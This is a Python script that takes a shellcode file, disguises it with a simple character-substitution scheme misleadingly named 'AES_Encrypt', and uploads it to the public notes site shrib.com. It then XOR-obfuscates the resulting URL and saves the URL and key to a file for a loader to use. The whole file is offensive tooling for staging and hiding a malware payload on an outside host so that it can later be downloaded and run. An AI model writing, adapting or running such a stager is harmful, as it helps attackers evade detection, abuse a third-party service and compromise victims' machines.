import requests
import json
import sys
import os
import struct
import random
import string
import ctypes


def getCookie():
    CookieUrl = "https://shrib.com/zuex/api.0.20677817052017977.svg"
    resp = requests.get(CookieUrl)
    print("[-] Failed to get cookie") if resp.cookies.items() == [] else print("[+] Succeeded in obtaining cookies");
    return resp.cookies if resp.cookies.items() != [] else exit()


def upContent(shellcode):
    cookies = getCookie()
    url = "https://shrib.com/zuex/api.php"
    parameters = {"action":"init", "qll":"none"}
    resp = requests.post(url = url, data = parameters, cookies = cookies)
    data = {"note": json.loads(resp.text).get("note").get("name"), "ssc": "1", "sync": shellcode }
    resp = requests.post(url, data = data, cookies = cookies)
    print("[-] Shellcode upload failed") if "timeSaved" not in resp.text else print("[+] Shellcode upload succeeded");
    return "https://shrib.com/{}".format(json.loads(resp.text).get("note").get("name")) if "timeSaved" in resp.text else exit()
    
def AES_Encrypt(vi, key, data):     
    replacearry = [0]*16
    indexnum = []
    replacedata = []
    payload = []
    b = 0
    for i in vi:
        replacearry[int(i)]=key[b] 
        b+=1
    for i in replacearry:
        if i != 0 and i != "0":
            indexnum.append(str(replacearry.index(i)))
            replacedata.append(i)
    data = data.replace("\\x","+-")
    for i in data:
        if i != "0" and i in indexnum:
            payload.append(replacedata[indexnum.index(i)])
        elif i == "0":
            payload.append(":")
        elif i == "x":
            payload.append("-")
        else:
            payload.append(i)
    if len(data) == len(payload):
        Shellcode = "".join(payload)
        return Shellcode
    else:
        print("[-] AES encryption failed")

    
def getShellcode():
    with open(sys.argv[1], "r") as payload_file:
        payload = payload_file.read()
    return payload
    
        
def randomIvAndKey():
    iv = ''.join(str(random.randint(1,9)) for i in range(16))
    key = ''.join(random.sample("ghijklmnopqrstuvwxyzGHIJKLMNOPQRSTUVWXYZ!@#$%^&|", 16))
    print("[+] Random offset generated successfully")
    print("[+] Random key generation succeeded")
    return iv,key

def writeAddress(shellcodeAddress,key):
    with open ("shekkAddressakey.txt","w") as config:
        config.write(shellcodeAddress+"\n"+key)
    print("[+] The random address was generated successfully and saved in shekkAddressakey")
    
def XorShellcodeAddress(ShellcodeAddress):
    letters = [chr(ascii_value) for ascii_value in range(33, 127)]
    key = "".join(random.choices(letters, k=random.randint(5, 10)))
    encryptShellcodeAddress = ""
    for i in range(len(ShellcodeAddress)):
        obf_char = chr(ord(ShellcodeAddress[i]) ^ ord(key[i % len(key)]))
        hex_char = hex(ord(obf_char))
        if len(hex_char) == 3:
            hex_char = f"0x0{hex_char[-1]}"
        encryptShellcodeAddress += hex_char
    return encryptShellcodeAddress,key
    
    
def main():
    if len(sys.argv) == 2:
        if os.path.exists(sys.argv[1]):
            shellcode = getShellcode()
            iv,key = randomIvAndKey()
            AES_Shellcode = AES_Encrypt(iv,key,shellcode)
            ShellcodeAddress = upContent(iv + key + AES_Shellcode)
            print("[+] The ShellcodeAddress is {}".format(ShellcodeAddress))
            encryptShellcodeAddress,key = XorShellcodeAddress(ShellcodeAddress)
            writeAddress(encryptShellcodeAddress,key)           
        else:
            print(f"[-] {sys.argv[1]} does not exists!")
    else:
        print("[-] Please provide the payload to obfuscate")
    
if __name__ == "__main__":
    main()
    